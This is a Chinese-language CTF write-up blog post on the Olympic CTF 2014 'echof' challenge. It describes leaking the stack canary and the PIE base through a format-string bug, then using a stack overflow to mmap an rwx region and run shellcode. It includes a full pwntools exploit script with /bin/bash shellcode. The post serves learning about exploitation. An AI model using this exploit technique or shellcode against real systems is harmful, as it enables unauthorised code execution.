---
title: olympic ctf echof(PWN 300)
author: rk700
layout: post
categories:
  - writeup
tags:
  - exploit
---

2015年第一帖。

以往的CTF的题目质量还是很高的，所以打算稍微练一练这些题目。

这道[题目](https://github.com/ctfs/write-ups/tree/a7ab67c0233da01f96047fe04d829731876438ad/olympic-ctf-2014/echof)，存在一处format string attack。主要是在`strncpy`后添加结尾的`null`字符时，如果长度足够，就会把之后用到的格式字符串地址最低byte设为0，而那里正好指向我们提供的内容，于是接下来的`sprintf`造成漏洞。

但是，在开始时会先检查我们提供的内容是否包括字符`n`，这就使得`%n`这种方式不可用了。于是format string就只能用来读内存。另一方面，由于`sprintf`的目标地址在栈上，所以这里可以溢出覆盖返回地址。由于有canary保护，我们需要读canary的内容，以用来后面溢出能通过检查。

这道题有一个与以往不同之处，就是可执行文件是PIE的，即程序自身的代码地址也会变化，而且以往那样直接在GOT固定位置得到函数地址的方法行不通了。比如说，通过调试发现，`call mmap`在我的机子上会成为调用相对`eip`偏移。

于是我们还需要读内存，得到`.text`的基地址。幸运的是，在栈上发现了指向某条指令的地址，于是通过读那里的内容，就可以获得`.text`段的地址了。进一步，通过读取`call mmap`指令处的偏移，就可以得到函数`mmap`的地址。

获得这些需要的地址后，接下来需要溢出改返回地址了。而不幸的是，发现canary的最低byte总是0，这就导致`strncpy`时会截断，格式字符串不完整了。后来发现，由于在`ret`之前有好几轮`sprintf`，于是可以先使用错误的canary，即最低byte非0而其他位正确，然后利用`sprintf`会把结尾的byte设为0，再一次溢出并只修改canary的最低位成为0。这样在最后的`ret`时canary就符合要求了。

同样地，在后面调用`mmap`时，参数也有很多`null`字符，这里也用和canary一样的思路写0到栈。具体调用时，尝试发现有些参数里不包括0也是可以的，比如`flag`。如下的调用

<pre>mmap(0x11111000, 0x01011000, 0x01010107, 0x01010122, -1, 0x01011000);</pre>

就会映射出

<pre>0x11111000 0x12122000 rwxp      mapped</pre>

综上，大概思路就是，先得到一段`rwx`的指定区域，然后`read`把shellcode读到那里，最后跳到那里执行。

{% highlight python %}
#!/usr/bin/env python2

from pwn import *
import sys

def sendNull(conn, payload):
    chunks = payload.split("\x00")
    clen = len(chunks)
    print "%d chunks" % clen
    for i in range(clen):
        plo = "\xaa".join(chunks)
        size1 = 0x80 - 5 - len(plo)
        size2 = 0x100-size1
        fmt = "%%%dx" % size2
        if not (len(fmt)+size1+len(plo) == 0x80):
            print "%d %s %d" % (size1, fmt, len(plo))
            exit (1)

        pl = "b"*size1 + fmt + plo
        conn.recvuntil("msg?\n")
        conn.send(pl)
        chunks = chunks[:-1]

if __name__ == '__main__' :
    context(arch='i386', os='linux')
    ip = "127.0.0.1"#sys.argv[1]
    conn = remote(ip, 1111)

    c1 = "%78$08x%80$08x"

    payload1 = "letmein\n" + c1 + "a"*(0x80-len(c1));


    conn.send(payload1)
    conn.recvuntil("msg?\n")

    canary = int(conn.recvn(8),16)
    print "canary is %s" % hex(canary)
    eip = int(conn.recvn(8),16)
    print "eip is %s" % hex(eip)
    base = eip & 0xfffff000
    print "base is %s" % hex(base)

    call_mmap = base + 0xae5
    call_read = base + 0xa78
    c2 = "%44$sABCD\n%45$s"
    payload2 = c2 + "a"*(0x80-len(c2)-8) + p32(call_mmap+1) + p32(call_read+1)

    conn.send(payload2)
    conn.recvuntil("msg?\n")
    mmap_off = unpack(conn.recvn(4))
    mmap = (call_mmap + 5 + mmap_off) & 0xffffffff
    print "mmap is %s" % hex(mmap)

    conn.recvuntil("ABCD\n")
    read_off = unpack(conn.recvn(4))
    read = (call_read + 5 + read_off) & 0xffffffff
    print "read is %s" % hex(read)

    pop = base+0x8b5 #pop 7 dword and ret
    target = 0x11111000
    payload2 = p32(canary) + "a"*12 + p32(mmap) + p32(pop) + p32(target) + p32(0x01011000) + p32(0x01010107) + p32(0x01010122) + p32(0xffffffff) + p32(0x01011000) + p32(0xffffffff) + p32(read) + p32(target+1) + p32(0) + p32(target+1) + p32(0xffffffff)

    sendNull(conn, payload2)

    conn.recvuntil("msg?\n")
    conn.send("n")

    shellcode = "\x31\xc0\x50\x89\xe2\x66\x68\x2d\x70\x89\xe1\x50\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80"
    conn.send(shellcode)

    conn.interactive()
{% endhighlight %}

我还考虑过这道题能不能利用内存泄露用pwntools得到`system`函数的地址，然后调用的方式。但那样的话还需要把`/bin/sh`放到指定的某处，而且限制16次可能不够找`system`，还需要再返回main来一遍。后来就没有试了。
